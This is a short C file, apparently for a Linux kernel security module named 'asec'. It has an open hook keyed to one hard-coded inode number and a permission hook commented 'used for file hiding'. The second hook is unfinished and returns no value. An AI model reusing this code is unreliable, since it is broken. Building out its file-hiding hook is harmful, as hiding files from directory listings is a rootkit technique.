#include "asec.h"

int asec_dentry_open(struct file *f, const struct cred *cred)
{
	/* Dont check read permission here if called from do_execve() */
	if (current->in_execve || f->f_path.dentry->d_inode->i_ino != 21107)
		return 0;

	return request_for_open(f);
}

/* used for file hiding */
int asec_file_permission(struct file *file, int mask)
{
	/* check whether it is called by vfs_readdir() */
	if (mask != MAY_READ || !S_ISDIR(file->f_mode))
		return 0;


}
